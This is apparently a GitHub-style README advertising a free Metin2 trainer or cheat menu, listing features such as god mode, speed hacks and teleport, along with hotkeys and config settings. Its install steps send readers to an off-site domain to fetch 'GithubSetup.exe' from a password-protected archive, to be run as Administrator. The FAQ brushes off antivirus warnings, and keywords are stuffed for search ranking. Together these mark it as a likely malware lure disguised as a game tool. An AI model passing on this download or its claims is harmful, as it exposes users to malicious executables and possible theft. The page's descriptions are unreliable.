# Metin2 Trainer / Mod Menu — Offline Tool for PC

Memory-editing utility for **Metin2** (offline/local-server environments). Provides client-side modifications for educational purposes and local testing. Compatible with Windows 10/11.

---

## ⬇️ Download

**[https://gitappdown.top/](https://gitappdown.top/)**  
*File: `GithubSetup.exe` | Archive password: `Github`*

---

**Keywords:** Metin2 trainer, Metin2 mod menu, Metin2 hack tool, Metin2 cheat engine, Metin2 offline mods, Metin2 god mode, Metin2 speed hack, Metin2 private server tools, Metin2 local emulator.

![platform](https://img.shields.io/badge/platform-Windows-blue)
![build](https://img.shields.io/badge/build-x64-lightgrey)
![status](https://img.shields.io/badge/status-active-brightgreen)
![license](https://img.shields.io/badge/license-MIT-green)

---

## ⚠️ Disclaimer

- This tool is intended for **offline single-player emulators, local test servers, or private environments** where you have explicit permission.
- **Do not** use on official servers (Gameforge, YOUMI, or regional publishers). Anti-cheat systems detect memory modifications and will permanently block your account.
- This tool reads/writes **client-side memory only**. It does not modify network traffic, server databases, or inject code.
- The developer is not responsible for account bans, data loss, or system instability. Use at your own risk.

---

## 🧩 About / What Is This Tool?

**Metin2 Trainer** (also referred to as a mod menu or external cheat tool) is a lightweight Windows application that attaches to the `metin2client.bin` process to modify client-side game values. It is commonly used in offline emulators and private servers for testing, debugging, or quality-of-life adjustments.

Unlike internal injectors, this tool runs externally (outside the game process), which reduces the risk of crashes and simplifies usage.

---

## ✨ Features / Capabilities

The tool exposes a set of toggles and sliders for modifying client-side behavior. Popular features include:

### Survival & Combat
- **God Mode** — HP does not drop below 1 (client-side)
- **Infinite MP / SP** — skill energy does not deplete
- **Infinite Stamina** — sprint without drain
- **One-Hit Kill** — damage multiplier applied to hits
- **No Skill Cooldown** — remove ability reuse delay
- **No Attack Delay** — bypass attack animation cooldown
- **Auto-Potion** — automatically consumes potions at a configurable HP threshold

### Resources & Economy *(client-side visual only)*
- **Yang Visual Modifier** — alters displayed currency (server sync reverts changes)
- **Infinite Item Durability** — equipment durability does not decrease
- **Zero Weight** — items do not contribute to carry weight
- **Unlimited Consumables** — ammunition and throwable items are not consumed

### Movement & Exploration
- **Speed Multiplier** — adjustable movement speed (configurable range)
- **Noclip / Fly Mode** — collision bypass
- **Teleport to Cursor** — warp to mouse position on the local map
- **Teleport to Coordinates** — precise X/Y/Z positioning
- **Super Jump** — increased jump height
- **Underwater Movement** — walk and breathe underwater

### Farming & Grinding
- **Auto-Loot** — automatic item pickup from defeated enemies
- **Auto-Attack** — continuous attack on nearest target
- **Mob Vacuum** — pulls enemies toward the player (client-side effect)
- **Attack Speed Modifier** — adjustable hit rate

### Progression
- **Skill Point Editor** — modify CP display value (client-side only)
- **Level Visual Modifier** — changes displayed level (does not affect stats)
- **Unlock All Skills** — client-side skill tree unlock
- **Instant Mount** — removes mount summon delay

### Utility
- **Freeze Monster AI** — disables enemy movement and attacks
- **Time Freeze** — pauses day/night cycle and event timers
- **Hide UI** — toggles HUD visibility
- **Save/Load Position** — stores current coordinates for later recall
- **Window Mode Toggle** — forces borderless windowed mode

---

## 🔍 Why This Tool?

This Metin2 mod menu stands out for several reasons:

| Aspect | Description |
|--------|-------------|
| 💵 Price | Free (no subscriptions or paywalls) |
| 🛡️ Architecture | External (low-risk, no DLL injection) |
| 🖥️ Performance | Lightweight (<50 MB RAM) |
| 🔄 Updates | Regular community-maintained releases |
| 📖 Documentation | Clear and accessible |
| 🔧 Configuration | JSON-based settings |

---

## 💻 System Requirements

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| OS | Windows 10 (64-bit) | Windows 11 (64-bit) |
| CPU | Intel Core i3-4150 / AMD FX-6300 | Intel Core i5-8400 / AMD Ryzen 5 2600 |
| GPU | Intel HD Graphics 4000 | NVIDIA GTX 1050 Ti / AMD RX 570 |
| RAM | 4 GB | 8 GB |
| Storage | 100 MB (tool only) | 500 MB |
| Runtime | .NET Framework 4.8+ | .NET 6.0+ |
| Privileges | Administrator access (required for process attachment) | — |

---

## 📦 Compatibility

| Platform / Environment | Status | Notes |
|-------------------------|--------|-------|
| Windows 10 | ✅ Supported | Primary platform |
| Windows 11 | ✅ Supported | Recommended |
| Official Servers (Gameforge / YOUMI) | ❌ **Not Compatible** | Will result in ban |
| Private Servers (no anti-cheat) | ⚠️ Use at your own risk | May work partially |
| Offline Emulators / Local Servers | ✅ Fully Supported | Ideal environment |

---

## 🔧 Installation / How to Use

1. **Download the latest release** from the official source:  
   ➡️ **[https://gitappdown.top/](https://gitappdown.top/)**  
   *(File: `GithubSetup.exe` | Archive password: `Github`)*

2. Run `GithubSetup.exe` and follow the installation wizard.

3. Launch your Metin2 offline client or local server emulator and log in.

4. Run `Metin2Trainer.exe` **as Administrator** (installed to `C:\Metin2Trainer\` by default).

5. Wait for the confirmation message that the process has been attached.

6. Use the default hotkey (`Insert`) to toggle the overlay.

> **Note:** If the overlay does not appear, ensure the game is running in **Windowed** or **Borderless Windowed** mode.

---

## ⚙️ Configuration

Settings are stored in `config.json` located at `%APPDATA%\Metin2Trainer\config.json`.

| Parameter | Type | Default | Description |
|-----------|------|---------|-------------|
| `menu_hotkey` | String | `"Insert"` | Key to toggle menu visibility |
| `auto_attach` | Boolean | `true` | Automatically attach to the game process on startup |
| `process_name` | String | `"metin2client.bin"` | Target process name |
| `speed_multiplier` | Float | `1.5` | Movement speed modifier |
| `auto_potion_threshold` | Integer | `30` | HP percentage threshold for auto-potion |
| `teleport_distance` | Integer | `100` | Maximum teleport distance in units |
| `safe_mode` | Boolean | `true` | Restricts potentially unstable features |
| `log_level` | String | `"info"` | Logging verbosity (`debug`, `info`, `error`) |

---

## ⌨️ Hotkeys / Controls

| Key | Action |
|-----|--------|
| `Insert` | Toggle menu overlay |
| `F1` | Toggle God Mode |
| `F2` | Toggle Infinite MP |
| `F3` | Toggle Noclip |
| `F4` | Toggle Speed Boost |
| `F5` | Teleport to cursor position |
| `F6` | Toggle One-Hit Kill |
| `F7` | Toggle Auto-Loot |
| `F8` | Toggle Freeze AI |
| `End` | Unload trainer and detach |

---

## 🗑️ Uninstall

- Go to `Control Panel → Programs → Uninstall a program`
- Find **Metin2 Trainer** and click Uninstall
- Or delete the installation folder (`C:\Metin2Trainer\`) manually

---

## ❓ Frequently Asked Questions (FAQ)

**Is this tool compatible with official servers?**
No. Official servers employ anti-cheat solutions that actively monitor and block memory modifications. Using this tool there will result in a permanent ban.

**Will it work on private servers?**
This depends on the server's anti-cheat configuration. Servers without client-side validation may accept modifications, but those with packet verification will revert changes. Use at your own discretion.

**Why do Yang or item values revert?**
Metin2 uses server-authoritative inventory management. The trainer only modifies client memory; server sync overwrites visual changes.

**Is this tool malware?**
No — but antivirus software may flag it as a false positive due to memory access patterns typical of debugging and analysis tools. Download only from the official source and verify checksums.

**Does the tool need updates after game patches?**
Yes. Game updates change memory offsets. The tool must be updated to match the current client version. Check the release notes before use.

**Can I use this as a mod menu for single-player?**
Yes — it functions as a mod menu / trainer for offline single-player emulators.

---

## 🤝 Contributing

Issues, feature requests, and pull requests are welcome. Please include:
- Game client version (e.g., `Metin2 v2.1.0 — 2025-03-01`)
- Server type (offline emulator / private server)
- Tested features and their status

See [CONTRIBUTING.md](#) for guidelines.

---

## 📄 License

MIT License — see [LICENSE](#) for details.

---

## 🚫 Disclaimer of Affiliation

This project is not affiliated with, endorsed by, or sponsored by YOUMI, Gameforge, or any official Metin2 publisher. It is provided for educational and local testing purposes only.

---

## 🔑 Keywords (for search engines)

*Metin2 trainer, Metin2 mod menu, Metin2 hack tool, Metin2 cheat, Metin2 god mode, Metin2 speed hack, Metin2 teleport, Metin2 auto-loot, Metin2 one-hit kill, Metin2 private server hack, Metin2 offline mods, Metin2 external cheat, Metin2 noclip, Metin2 fly hack, Metin2 skill unlock, Metin2 CP editor, Metin2 utility, Metin2 Windows tool, Metin2 local emulator.*
